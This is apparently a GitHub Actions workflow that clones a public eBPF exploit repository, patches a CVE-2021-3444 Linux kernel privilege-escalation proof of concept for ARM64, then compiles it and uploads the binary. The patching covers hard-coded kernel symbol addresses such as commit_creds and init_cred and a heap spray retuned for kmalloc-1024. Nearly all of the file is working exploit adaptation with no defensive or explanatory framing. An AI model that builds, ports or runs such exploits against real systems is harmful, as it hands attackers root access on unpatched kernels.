name: botti_arm64_defrag_1024
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-24.04-arm
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: |
          sudo apt-get update -y
          sudo apt-get install -y gcc make git

      - name: Clone and patch PoC for ARM64 kmalloc-1024
        run: |
          git clone https://github.com/Botti01/eBPF-CVE-exploitation.git
          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
          
          # Patch struct size and defrag for kmalloc-1024
          sed -i 's|#define BPF_ARRAY_VALUE_OFFSET 208|#define BPF_ARRAY_VALUE_OFFSET 320|' exploit.c
          
          # Patch the defrag loop - create maps with bigger values (512 instead of 256)
          # so they go into kmalloc-1024 instead of kmalloc-512
          sed -i 's|MAP_VALUE_SIZE 256|MAP_VALUE_SIZE 512|' exploit.c
          
          # The key: change "Defragmented kmalloc-512 with 100 array maps" 
          # to use value_size=512 (which means each map is 320+512=832 bytes -> kmalloc-1024)
          
          # Patch ARM64 symbols
          sed -i 's|#define KERNEL_BASE 0xffffffff81000000ULL|#define KERNEL_BASE 0xffffff8008080000ULL|' exploit.c
          sed -i 's|#define ARRAY_MAP_OPS 0xffffffff81a1c8c0ULL|#define ARRAY_MAP_OPS 0xffffff8008f5d500ULL|' exploit.c
          sed -i 's|#define ARRAY_OF_MAPS_MAP_OPS 0xffffffff81a1c640ULL|#define ARRAY_OF_MAPS_MAP_OPS 0xffffff8008f5d780ULL|' exploit.c
          sed -i 's|#define FD_ARRAY_MAP_DELETE_ELEM 0xffffffff810e32d0ULL|#define FD_ARRAY_MAP_DELETE_ELEM 0xffffff80081d6cecULL|' exploit.c
          sed -i 's|#define COMMIT_CREDS 0xffffffff81072470ULL|#define COMMIT_CREDS 0xffffff80080e03dcULL|' exploit.c
          sed -i 's|#define INIT_CRED 0xffffffff81e355e0ULL|#define INIT_CRED 0xffffff8009787f48ULL|' exploit.c
          
          # Also: OUTER_MAX_ENTRIES should be 16 (16*8=128 bytes) - keep as is
          
          echo "=== Verify patches ==="
          grep -E "BPF_ARRAY_VALUE_OFFSET|MAP_VALUE_SIZE|OUTER_MAX_ENTRIES|OPS_OFFSET" exploit.c

      - name: Compile
        run: |
          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
          gcc -static -O2 -I ../../../common/include exploit.c -o exploit_1024
          ls -la exploit_1024

      - uses: actions/upload-artifact@v4
        with:
          name: botti-arm64-1024
          path: eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc/exploit_1024
